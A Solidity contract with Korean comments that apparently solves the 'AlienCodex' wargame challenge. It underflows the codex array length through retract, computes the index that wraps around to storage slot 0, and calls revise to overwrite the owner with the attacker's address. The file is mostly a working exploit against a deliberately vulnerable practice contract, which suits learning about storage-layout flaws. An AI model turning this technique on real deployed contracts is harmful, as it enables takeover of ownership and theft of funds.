// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 목표
 * AlienCodex 컨트랙트의 Owner 주소를 공격자 주소로 변조하기
 * 
 * 공격 방식
 * 1. makeContact 함수를 실행하여 다른 컨트랙트를 사용가능한 상태로 전환
 * 2. retract 함수를 실행하여 codex[] 길이 값에 Integer Overflow를 발생시켜 길이 값을 2**256 -1로 변경
 * 3. EVM의 Storage Slot은 0 ~ 2**256 -1 범위의 순환(Wraparound) 구조이기 때문에 2번의 행위로 인해 모든 Storage Slot 접근 가능
 * 4. owner 변수의 Storage Slot은 Ownable 컨트랙트가 상속관계인 관계로 0에서 시작
 * 5. owner 변수의 Storage Slot인 0을 codex[] 에서 참조하기 위해 아래의 공식을 통해 계산하면 접근 가능
 *   - (2 ** 256 - 1) - uint256(keccak256(abi.encode(1))) + 1
 *     - (2 ** 256 - 1) : 0에서 -1을 계산한 retract() 함수와 동일한 결과값을 내도록 사전 지정
 *     - uint256(keccak256(abi.encode(1))) : codex[] 배열의 첫번째 요소의 위치를 계산하기 위한 수식
 *     - +1 : 앞서 계산한 codex[] 배열의 첫 요소 위치에서 +1 연산 수행 시 owner 변수 참조 상태로 변화
 * 6. 접근 가능하도록 Index 값 계산 후 revise 함수를 호출하면서 공격자의 주소를 bytes32 형태로 기록하여 owner 변수의 정보를 공격자의 주소로 변경
 */ 

interface AlienCodex {
    function makeContact() external;
    function record(bytes32) external;
    function retract() external;
    function revise(uint256, bytes32) external;
}

contract Solve {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        unchecked {
            AlienCodex(target).makeContact();
            AlienCodex(target).retract();

            uint256 arraySlotStart = uint256(keccak256(abi.encode(1)));

            uint256 targetIndex = 0;

            targetIndex -= 1;               // 2 ** 256 - 1
            targetIndex -= arraySlotStart;  // 2 ** 256 - 1 - arraySlotStart
            targetIndex += 1;               // 2 ** 256 - arraySlotStart

            AlienCodex(target).revise(targetIndex, bytes32(uint256(uint160(msg.sender))));
        }
    }
}